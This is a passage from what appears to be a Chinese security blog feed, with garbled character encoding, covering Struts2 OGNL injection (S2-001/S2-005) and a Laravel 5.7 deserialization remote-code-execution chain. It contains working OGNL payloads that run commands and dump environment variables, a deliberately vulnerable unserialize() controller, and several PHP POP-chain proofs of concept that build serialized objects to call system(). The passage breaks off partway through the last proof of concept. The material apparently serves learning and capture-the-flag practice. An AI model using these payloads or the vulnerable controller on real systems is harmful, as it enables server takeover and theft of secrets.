null&#125;å°†è·å¾—æŸä¸ªgroupä¸­userçš„nameä¸ä¸ºç©ºçš„userçš„åˆ—è¡¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ©ç”¨è¯­å¥"><a href="#åˆ©ç”¨è¯­å¥" class="headerlink" title="åˆ©ç”¨è¯­å¥"></a>åˆ©ç”¨è¯­å¥</h4><pre class="line-numbers language-none"><code class="language-none">è·å–Tomcatè·¯å¾„%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;è·å–webè·¯å¾„%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;å‘½ä»¤æ‰§è¡Œ%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;è·å–flagï¼Œåœ¨envä¸­password&#x3D;%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="s2-005æ¼æ´"><a href="#s2-005æ¼æ´" class="headerlink" title="s2-005æ¼æ´"></a>s2-005æ¼æ´</h3><h4 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;193078.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>S2-005å’ŒS2-003çš„åŸç†æ˜¯ç±»ä¼¼çš„ï¼Œå› ä¸ºå®˜æ–¹åœ¨ä¿®è¡¥S2-003ä¸å…¨é¢ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ç»•è¿‡å®˜æ–¹çš„å®‰å…¨é…ç½®ï¼ˆç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œï¼‰ï¼Œå†æ¬¡é€ æˆçš„æ¼æ´ï¼Œå¯ä»¥è¯´S2-005æ˜¯å‡çº§ç‰ˆçš„S2-003ã€‚</p><p>å…ˆçœ‹s2-003</p><pre class="line-numbers language-none"><code class="language-none">Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œ,è€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.11.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹å®˜æ–¹æ˜¯å¦‚ä½•ä¿®è¡¥çš„S2-003å‘¢ï¼Ÿå®ƒæ˜¯æ–°å‡ºäº†ä¸€ä¸ªæ²™ç›’æœºåˆ¶ï¼Œé»˜è®¤ç¦æ­¢äº†é™æ€æ–¹æ³•çš„è°ƒç”¨ï¼ˆ<code>allowStaticMethodAcces</code>å’Œ<code>MethodAccessor.denyMethodExecution</code>ï¼‰</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨OGNLå…ˆæŠŠæ²™ç›’å…³é—­æ‰ï¼Œå°±åˆå¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><blockquote><p><code>xwork.MethodAccessor.denyMethodExecution</code>è®¾ç½®ä¸ºfalse</p><p><code>allowStaticMethodAccess</code>è®¾ç½®ä¸ºtrue</p></blockquote><p>è¿™æ ·å°±å¯ä»¥å…³é—­æ‰æ²™ç›’æœºåˆ¶ï¼Œunicodeç¼–ç ä»ç„¶è¿˜æ˜¯å¯ä»¥çš„ï¼Œ<code>\u0023</code>ä¼šè¢«è§£ææˆ<code>#</code>ï¼ŒPOCè¿˜æ˜¯åŸæ¥çš„POCï¼Œåªä¸è¿‡åŠ ä¸Šäº†ä¸Šé¢çš„ä¸¤ä¸ªè®¾ç½®ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> structs2 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7ååºåˆ—åŒ–</title>
      <link href="/2022/04/30/laravel5-7-fan-xu-lie-hua/"/>
      <url>/2022/04/30/laravel5-7-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰æœŸå‡†å¤‡-amp-å‚è€ƒèµ„æ–™"><a href="#å‰æœŸå‡†å¤‡-amp-å‚è€ƒèµ„æ–™" class="headerlink" title="å‰æœŸå‡†å¤‡&amp;å‚è€ƒèµ„æ–™"></a>å‰æœŸå‡†å¤‡&amp;å‚è€ƒèµ„æ–™</h3><h4 id="composerç›¸å…³ï¼š"><a href="#composerç›¸å…³ï¼š" class="headerlink" title="composerç›¸å…³ï¼š"></a>composerç›¸å…³ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;blog.unvs.cn&#x2F;archives&#x2F;phpstudy-composer-setup-use.htmlhttps:&#x2F;&#x2F;www.runoob.com&#x2F;w3cnote&#x2F;composer-install-and-usage.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="ååºåˆ—åŒ–å‚è€ƒ"><a href="#ååºåˆ—åŒ–å‚è€ƒ" class="headerlink" title="ååºåˆ—åŒ–å‚è€ƒ"></a>ååºåˆ—åŒ–å‚è€ƒ</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;blog.csdn.net&#x2F;rfrder&#x2F;article&#x2F;details&#x2F;113826483https:&#x2F;&#x2F;laworigin.github.io&#x2F;2019&#x2F;02&#x2F;21&#x2F;laravelv5-7ååºåˆ—åŒ–rce&#x2F;https:&#x2F;&#x2F;blog.csdn.net&#x2F;meteox&#x2F;article&#x2F;details&#x2F;121751311<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>githubæ‹–æºç ï¼š<a href="https://github.com/laravel/laravel/tree/5.7">laravel5.7</a></p><p>å®˜æ–¹apiæ–‡æ¡£ï¼š<a href="https://laravel.com/api/5.8/">https://laravel.com/api/5.8/</a></p><p>è®°å¾—å®‰è£…composerï¼ï¼ï¼ï¼ˆå¯ä»¥ä½¿ç”¨phpstudyé›†æˆçš„ï¼Œcomposer installä¼šé‡åˆ°æŠ¥é”™ï¼Œéœ€è¦ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œå¯ä»¥å‚è€ƒä¸Šé¢çš„é“¾æ¥</p><p>composer installå…¶å®è¿˜æ˜¯è¦ä¸‹è½½æŒºå¤šä¸œè¥¿çš„ã€‚</p><h4 id="æ·»åŠ ååºåˆ—åŒ–è·¯ç”±"><a href="#æ·»åŠ ååºåˆ—åŒ–è·¯ç”±" class="headerlink" title="æ·»åŠ ååºåˆ—åŒ–è·¯ç”±"></a>æ·»åŠ ååºåˆ—åŒ–è·¯ç”±</h4><p>æ³¨æ„è®¿é—®index.phpçš„è·¯å¾„åº”è¯¥ä¸º<code>http://127.0.0.1/laravel5.7/public/index.php</code></p><p>æ³¨æ„å§æ ¹ç›®å½•ä¸‹é¢çš„<code>.env.example</code>æ”¹ä¸º<code>.env</code>ï¼ˆå¤ªè‰¹äº†</p><p>åŸæ¥è¿˜è¦ç”Ÿæˆä¸€ä¸ªkey,æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼Œæ ¹æ®è‡ªå·±composer installçš„phpç‰ˆæœ¬æ‰§è¡Œå¯èƒ½æ¯”è¾ƒåˆé€‚<code>D:\phpstudty8.1\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe artisan key:generate</code>ï¼ˆè¿™ä¸ªæ›´è‰¹äº†ï¼Œ<del>æˆ‘å®£å¸ƒlaravelçš„å‰æœŸå‡†å¤‡çœŸçš„sb</del></p><p>å…ˆåœ¨routes&#x2F;web.phpæ·»åŠ ä¸€æ¡è·¯ç”±è§£æè®°å½•<code>Route::get(&#39;/unser&#39;, &#39;unserialize@unser&#39;);</code></p><p>ç„¶ååœ¨app&#x2F;Http&#x2F;Controllersä¸‹é¢æ·»åŠ unserialize.phpï¼Œå†™ä¸Šæºä»£ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace App\Http\Controllers;class UnserializeController extends Controller&#123;    public function unser()&#123;        if(isset($_GET[&#39;unser&#39;]))&#123;            unserialize($_GET[&#39;unser&#39;]);        &#125;else&#123;            highlight_file(__FILE__);        &#125;        return &quot;unser&quot;;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–çš„payloadç¼–å†™å°±è‡ªè¡Œéšä¾¿å»ºç«‹ä¸€ä¸ªSerialize.phpç¼–å†™å³å¯ã€‚</p><h3 id="ååºåˆ—åŒ–é“¾å­åˆ†æ"><a href="#ååºåˆ—åŒ–é“¾å­åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–é“¾å­åˆ†æ"></a>ååºåˆ—åŒ–é“¾å­åˆ†æ</h3><p>å¯¹æ¯”5.6å’Œ5.7ç‰ˆæœ¬ï¼Œå¯ä»¥çŸ¥é“å¤šå‡ºäº†ä¸ªPendingCommand.phpï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼š<code>D:\phpstudty8.1\phpstudy_pro\WWW\laravel5.7\vendor\laravel\framework\src\Illuminate\Foundation\Testing</code></p><p>æŸ¥é˜…å®˜æ–¹apiæ–‡æ¡£å¯çŸ¥ï¼Œè¿™ä¸ªPendingCommandå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™ä¸æ˜¯é€ä¸Šæ¥çš„æ´å—ï¼Œç»§ç»­ç¿»çœ‹å¯çŸ¥__destructæ–¹æ³•ä¼šè°ƒç”¨runæ–¹æ³•(ç°åœ¨çœ‹åˆ° destructæ–¹æ³•å°±æ¿€åŠ¨hhhï¼‰ï¼Œrunæ–¹æ³•æ˜æ˜¾å°±æ˜¯æ¥è¿›è¡Œ<code>commmand execute</code>ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯æ„é€ popé“¾æ¥è§¦å‘PendingCommandäº†ã€‚runæ–¹æ³•å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">public function run()   &#123;       $this-&gt;hasExecuted &#x3D; true;       $this-&gt;mockConsoleOutput();       try &#123;           $exitCode &#x3D; $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);       &#125; catch (NoMatchingExpectationException $e) &#123;           if ($e-&gt;getMethodName() &#x3D;&#x3D;&#x3D; &#39;askQuestion&#39;) &#123;               $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;);           &#125;           throw $e;       &#125;       if ($this-&gt;expectedExitCode !&#x3D;&#x3D; null) &#123;           $this-&gt;test-&gt;assertEquals(               $this-&gt;expectedExitCode, $exitCode,               &quot;Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;.&quot;           );       &#125;       return $exitCode;   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ä¸»è¦çš„åˆ©ç”¨ç‚¹åœ¨<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>è¿™é‡Œï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•èµ°åˆ°è¿™ä¸€å¥è¯ã€‚</p><p>å…ˆå†™ä¸€ä¸ªPOCéªŒè¯ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;calc&#39;;        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°æŠ¥é”™äº†ï¼Œthis-&gt;testæ²¡æœ‰expectedOutputè¿™ä¸ªå±æ€§<img src="/images/5.7/1.png" class="lazyload placeholder" data-srcset="/images/5.7/1.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>çœ‹æ¥å¾—æ­£å¸¸æ‰§è¡Œ<code>$this-&gt;mockConsoleOutput();</code>å‡½æ•°æ‰è¡Œï¼Œä¸‹é¢å¼€å§‹å°è¯•ã€‚</p><p>å¤§å¸ˆå‚…ä»¬ç»è¿‡å¯»æ‰¾ï¼Œé€‰æ‹©äº†<code>Illuminate\Auth\GenericUser</code>ç±»ï¼Œæœ‰ä¸€ä¸ªgetæ–¹æ³•å¯ä»¥è°ƒç”¨ï¼š</p><p><img src="/images/5.7/get.png" class="lazyload placeholder" data-srcset="/images/5.7/get.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>è°ƒæ•´å®Œåï¼Œå¯ä»¥ç»•è¿‡ä¸Šé¢é‚£ä¸ªé”™è¯¯äº†ï¼ŒPOCå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;calc&#39;;            $this-&gt;test&#x3D;new GenericUser();        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯é‡åˆ°äº†æ–°çš„é”™è¯¯ï¼Œ<code>Call to a member function bind() on null</code>ï¼š</p><p><img src="/images/5.7/bind.png" class="lazyload placeholder" data-srcset="/images/5.7/bind.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>åŸå› å¤§æ¦‚æ˜¯this-&gt;appä¸ºç©ºï¼Œæ‰€ä»¥å†™ä¸€ä¸ªè¿›å»å…ˆï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;calc&#39;;            $this-&gt;test&#x3D;new GenericUser();            $this-&gt;app&#x3D;new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application    &#123;        public function __construct()&#123;        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–åï¼Œä¼ å…¥unserï¼ŒåˆæŠ¥é”™äº†ï¼š</p><p><img src="/images/5.7/kernel.png" class="lazyload placeholder" data-srcset="/images/5.7/kernel.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p><code>Kernel::class</code>æ˜¯å®Œå…¨é™å®šåç§°ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªç±»çš„å®Œæ•´çš„å¸¦ä¸Šå‘½åç©ºé—´çš„ç±»åï¼Œåœ¨laravelè¿™é‡Œæ˜¯<code>Illuminate\Contracts\Console\Kernel</code>ã€‚</p><p><code>class Application extends Container implements ApplicationContract, HttpKernelInterface</code>è¿™é‡Œå¯ä»¥çœ‹å‡ºApplocationå…¶å®æ˜¯Containerçš„å­ç±»ï¼Œæ‰€ä»¥ä¼šç»§æ‰¿Containerçš„æ‰€æœ‰å‡½æ•°ã€‚</p><p>å¯ä»¥å‘ç°è¿›å…¥äº†Container.phpï¼Œä¸€è·¯è·Ÿè¸ªä¸‹å»å‘ç°æœ€åä¼šè¿”å›ä¸€ä¸ªobjectï¼Œobjectä¼šå»è°ƒç”¨callå‡½æ•°ï¼Œæœä¸€ä¸‹containerçš„callå‡½æ•°ï¼Œè·Ÿè¸ªè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>å…ˆæ˜¯è¿›å…¥offsetGetï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Get the value at a given offset.     *     * @param  string  $key     * @return mixed     *&#x2F;    public function offsetGet($key)    &#123;        return $this-&gt;make($key);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¿›å…¥makeï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Resolve the given type from the container.     *     * @param  string  $abstract     * @param  array  $parameters     * @return mixed     *&#x2F;    public function make($abstract, array $parameters &#x3D; [])    &#123;        return $this-&gt;resolve($abstract, $parameters);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹‹åæ¥åˆ°resolveï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Resolve the given type from the container.     *     * @param  string  $abstract     * @param  array  $parameters     * @return mixed     *&#x2F;    protected function resolve($abstract, $parameters &#x3D; [])    &#123;        $abstract &#x3D; $this-&gt;getAlias($abstract);        $needsContextualBuild &#x3D; ! empty($parameters) || ! is_null(            $this-&gt;getContextualConcrete($abstract)        );        &#x2F;&#x2F; If an instance of the type is currently being managed as a singleton we&#39;ll        &#x2F;&#x2F; just return an existing instance instead of instantiating new instances        &#x2F;&#x2F; so the developer can keep using the same objects instance every time.        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;            return $this-&gt;instances[$abstract];        &#125;        $this-&gt;with[] &#x3D; $parameters;        $concrete &#x3D; $this-&gt;getConcrete($abstract);        &#x2F;&#x2F; We&#39;re ready to instantiate an instance of the concrete type registered for        &#x2F;&#x2F; the binding. This will instantiate the types, as well as resolve any of        &#x2F;&#x2F; its &quot;nested&quot; dependencies recursively until all have gotten resolved.        if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object &#x3D; $this-&gt;build($concrete);        &#125; else &#123;            $object &#x3D; $this-&gt;make($concrete);        &#125;        &#x2F;&#x2F; If we defined any extenders for this type, we&#39;ll need to spin through them        &#x2F;&#x2F; and apply them to the object being built. This allows for the extension        &#x2F;&#x2F; of services, such as changing configuration or decorating the object.        foreach ($this-&gt;getExtenders($abstract) as $extender) &#123;            $object &#x3D; $extender($object, $this);        &#125;        &#x2F;&#x2F; If the requested type is registered as a singleton we&#39;ll want to cache off        &#x2F;&#x2F; the instances in &quot;memory&quot; so we can return it later without creating an        &#x2F;&#x2F; entirely new instance of an object on each subsequent request for it.        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;            $this-&gt;instances[$abstract] &#x3D; $object;        &#125;        $this-&gt;fireResolvingCallbacks($abstract, $object);        &#x2F;&#x2F; Before returning, we will also set the resolved flag to &quot;true&quot; and pop off        &#x2F;&#x2F; the parameter overrides for this build. After those two things are done        &#x2F;&#x2F; we will be ready to return back the fully constructed class instance.        $this-&gt;resolved[$abstract] &#x3D; true;        array_pop($this-&gt;with);        return $object;    &#125;&#x2F;&#x2F;è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ€åæ˜¯è¿”å›äº†ä¸€ä¸ªobjectçš„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Containerçš„callå‡½æ•°ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Call the given Closure &#x2F; class@method and inject its dependencies.     *     * @param  callable|string  $callback     * @param  array  $parameters     * @param  string|null  $defaultMethod     * @return mixed     *&#x2F;    public function call($callback, array $parameters &#x3D; [], $defaultMethod &#x3D; null)    &#123;        return BoundMethod::call($this, $callback, $parameters, $defaultMethod);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>WisdomTreeå¤§å¸ˆå‚…çš„æƒ³æ³•:</p><p>é€šè¿‡æ•´ä½“è·Ÿè¸ªï¼ŒçŒœæµ‹å¼€å‘è€…çš„æœ¬æ„åº”è¯¥æ˜¯å®ä¾‹åŒ–<code>Illuminate\Contracts\Console\Kernel</code>è¿™ä¸ªç±»ï¼Œä½†æ˜¯åœ¨<code>getConcrete</code>è¿™ä¸ªæ–¹æ³•ä¸­å‡ºäº†é—®é¢˜ï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨phpçš„åå°„æœºåˆ¶å®ä¾‹åŒ–ä»»æ„ç±»ã€‚é—®é¢˜å‡ºåœ¨<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>çš„704è¡Œï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œåˆ¤æ–­<code>$this-&gt;bindings[$abstract])</code>æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›<code>$this-&gt;bindings[$abstract][&#39;concrete&#39;]</code>ã€‚</p><p><code>$bindings</code>æ˜¯<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>æ–‡ä»¶ä¸­<code>Container</code>ç±»ä¸­çš„å±æ€§ã€‚å› æ­¤æˆ‘ä»¬åªè¦å¯»æ‰¾ä¸€ä¸ªç»§æ‰¿è‡ª<code>Container</code>çš„ç±»ï¼Œå³å¯é€šè¿‡ååºåˆ—åŒ–æ§åˆ¶ <code>$this-&gt;bindings</code>å±æ€§ã€‚è€Œ<code>Illuminate\Foundation\Application</code>æ°å¥½ç»§æ‰¿è‡ª<code>Container</code>ç±»ï¼Œè¿™å°±æ˜¯æˆ‘é€‰æ‹©<code>Illuminate\Foundation\Application</code>å¯¹è±¡æ”¾å…¥<code>$this-&gt;app</code>çš„åŸå› ã€‚ç”±äºæˆ‘ä»¬å·²çŸ¥<code>$abstract</code>å˜é‡ä¸º<code>Illuminate\Contracts\Console\Kernel</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€é€šè¿‡ååºåˆ—åŒ–å®šä¹‰<code>Illuminate\Foundation\Application</code>çš„<code>$bindings</code>å±æ€§å­˜åœ¨é”®åä¸º<code>Illuminate\Contracts\Console\Kernel</code>çš„äºŒç»´æ•°ç»„å°±èƒ½è¿›å…¥è¯¥åˆ†æ”¯è¯­å¥ï¼Œè¿”å›æˆ‘ä»¬è¦å®ä¾‹åŒ–çš„ç±»åã€‚åœ¨è¿™é‡Œè¿”å›çš„æ˜¯<code>Illuminate\Foundation\Application</code>ç±»ã€‚  </p><p>ä»resolveé‚£é‡Œå¼€å§‹ï¼Œæœ‰è¿™ä¸ª<code>$concrete = $this-&gt;getConcrete($abstract);</code>ï¼Œæ¥çœ‹çœ‹getConcreteï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Get the concrete type for a given abstract.     *     * @param  string  $abstract     * @return mixed   $concrete     *&#x2F;    protected function getConcrete($abstract)    &#123;        if (! is_null($concrete &#x3D; $this-&gt;getContextualConcrete($abstract))) &#123;            return $concrete;        &#125;        &#x2F;&#x2F; If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just        &#x2F;&#x2F; assume each type is a concrete name and will attempt to resolve it as is        &#x2F;&#x2F; since the container should be able to resolve concretes automatically.        if (isset($this-&gt;bindings[$abstract])) &#123;            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];        &#125;        return $abstract;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æå¯çŸ¥ç¬¬ä¸€ä¸ªifè¿›ä¸å»ï¼Œæ¥åˆ°ç¬¬äºŒä¸ªifï¼Œè¿™ä¸ªbindingsæ˜¯containerçš„å±æ€§ï¼Œæ‰€ä»¥å¯æ§ï¼Œthisæ˜¯æˆ‘ä»¬æ§åˆ¶çš„applicationå¯¹è±¡ï¼Œæ‰€ä»¥è¿™ä¸ªgetConcreteè¿”å›å€¼æˆ‘ä»¬ä¹Ÿæ˜¯å¯æ§çš„ã€‚</p><p>å†™ä¸ªPOCéªŒè¯ä¸€ä¸‹ï¼Œä¸è¯•ä¸çŸ¥é“ï¼Œä¸€è¯•ä¸‹ä¸€è·³ï¼Œç›´æ¥æ‰“ç©¿äº†å“ˆå“ˆå“ˆå“ˆï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;dir&#39;;            $this-&gt;test&#x3D;new GenericUser();            $this-&gt;app&#x3D;new Application();        &#125;    